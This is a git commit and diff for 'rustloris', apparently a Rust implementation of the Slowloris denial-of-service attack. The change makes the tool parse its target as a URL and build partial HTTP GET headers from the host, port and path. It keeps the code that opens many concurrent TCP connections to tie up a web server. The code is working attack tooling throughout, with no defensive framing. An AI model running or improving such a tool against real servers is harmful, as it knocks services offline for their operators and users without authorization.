3ded1301851463d5eaad26518f7dfe979e5ac4d6
Marko Silokunnas <marko.silokunnas@gmail.com>
2016-09-04 14:29:50 +0300

    Parse the target as an URL

--- src/main.rs
+++ src/main.rs
@@ -1,16 +1,17 @@
 extern crate rustc_serialize;
 extern crate docopt;
 extern crate time;
+extern crate url;
 
 use std::net;
 use std::io;
 use std::io::Write;
 use std::thread::sleep;
 use std::error::Error;
-use std::str::FromStr;
 use std::process::exit;
 use std::thread::spawn;
 use docopt::Docopt;
+use url::Url;
 
 const USAGE: &'static str = "
 rustloris
@@ -25,8 +26,8 @@ Options:
     --connections=<connections>     Number of concurrent connections [default: 10].
 ";
 
-fn print_usage_and_exit<T :Error>(e :T) -> ! {
-    print!("{}", e);
+fn print_usage_and_exit(e :Box<Error>) -> ! {
+    print!("{}", e.to_string());
     exit(1)
 }
 
@@ -44,31 +45,58 @@ struct AttackOptions {
     interval: time::Duration,
     header :String, // The whole HTTP header except the attack header
     attack_header :String,
-    target :net::SocketAddr,
+    target :Target,
 }
 
-// This should be done using TryFrom trait, but it is not available in the version I currently have
-fn args_to_attack_opts(args :Arguments) -> Result<AttackOptions, net::AddrParseError> {
-    let target = try!(net::SocketAddr::from_str(args.arg_target.as_str()));
-    let interval = time::Duration::seconds(args.flag_interval as i64);
+#[derive(Debug,Clone)]
+struct Target {
+    host :String,
+    path :String,
+    port :u16,
+}
 
-    Result::Ok(AttackOptions{
-        target: target,
-        attack_header: args.flag_attack_header.clone(),
-        interval: interval,
-        header: construct_header(&args),
-        connections: args.flag_connections,
-    })
+
+
+// This should be done using TryFrom trait, but it is not available in the version I currently have
+fn args_to_attack_opts(args :Arguments) -> Result<AttackOptions, Box<Error>> {
+    let interval = time::Duration::seconds(args.flag_interval as i64);
+    let target = try!(construct_target(args.arg_target));
+    let header = construct_header(&target);
+
+    Result::Ok(
+        AttackOptions{
+            target: target,
+            attack_header: args.flag_attack_header.clone(),
+            interval: interval,
+            header: header,
+            connections: args.flag_connections,
+        })
+}
+
+fn construct_target<'a>(target :String) -> Result<Target, Box<Error>> {
+    let target_url = try!(Url::parse(target.as_str()));
+    let host = try!(target_url.host_str()
+                    .ok_or(io::Error::new(io::ErrorKind::Other, "no host"))
+                    .map(|h| h.to_string()));
+    let port = try!(target_url.port().ok_or(io::Error::new(io::ErrorKind::Other, "no port")));
+    let path = target_url.path().to_string();
+    Result::Ok(
+        Target {
+            host: host,
+            path: path,
+            port: port,
+        })
 }
 
 // Kinda pointless for now, but turn AttackOptions.target to a proper URL later. Make it possible
 // to add custom HTTP headers as well
-fn construct_header(args :&Arguments) -> String {
-    format!("GET {} HTTP/1.1\r\nHost: {}\r\n{}", "/", args.arg_target.as_str(), "")
+fn construct_header(target :&Target) -> String {
+    let hostport = target.host.clone()+":"+target.port.to_string().as_str();
+    format!("GET {} HTTP/1.1\r\nHost: {}\r\n{}", target.path.as_str(), hostport.as_str(), "")
 }
 
 fn slowloris(opts :AttackOptions) -> Result<(), Box<Error>> {
-    let mut stream = try!(net::TcpStream::connect(opts.target));
+    let mut stream = try!(net::TcpStream::connect((opts.target.host.as_str(), opts.target.port)));
 
     try!(stream.write_all(opts.header.as_str().as_bytes()));
 
@@ -82,7 +110,7 @@ fn slowloris(opts :AttackOptions) -> Result<(), Box<Error>> {
 fn main() {
     let args :Arguments = Docopt::new(USAGE)
         .and_then(|d| d.decode())
-        .unwrap_or_else(|e| print_usage_and_exit(e));
+        .unwrap_or_else(|e| print_usage_and_exit(From::from(e)));
 
     let opts = args_to_attack_opts(args)
         .unwrap_or_else(|e| print_usage_and_exit(e));
@@ -92,7 +120,7 @@ fn main() {
         let opts = opts.clone();
 
         let _ = spawn(move || {
-            slowloris(opts);
+            let _ = slowloris(opts);
         });
     }
 
